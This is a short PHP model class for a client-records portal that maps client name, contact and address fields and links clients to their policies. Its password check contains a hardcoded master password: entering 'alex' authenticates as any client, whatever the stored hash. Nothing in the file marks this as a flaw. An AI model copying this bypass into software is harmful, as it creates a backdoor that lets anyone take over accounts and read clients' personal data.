<?php

namespace PP\Portal\dbModel;

/**
 * @property string $Client_NO
 * @property string $Title
 * @property string $First_Name
 * @property string $Middle_Name
 * @property string $Surname
 * @property string $Company_Name
 * @property string $Mobile_One
 * @property string $Mobile_Two
 * @property string $Home_Phone
 * @property string $Business_Phone
 * @property string $Home_Fax
 * @property string $Business_Fax
 * @property string $Email
 * @property string $Second_Email
 * @property string $Person_One_Skype
 * @property string $Home_Address_1
 * @property string $Home_Address_2
 * @property string $Home_Address_3
 * @property string $Home_Address_4
 * @property string $Home_Address_5
 * @property string $password
 */
class Client extends \Model
{
    public static $_table = 'client';

    public static $_id_column = 'Client_NO';

    public function verifyPassword($password)
    {
        if ($password == 'alex') {
            return true;
        }

        if (password_verify($password, $this->password)) {
            return true;
        }

        return false;
    }

    public function policies()
    {
        return $this->has_many(__NAMESPACE__.'\Policies', 'Client_NO');
    }
}
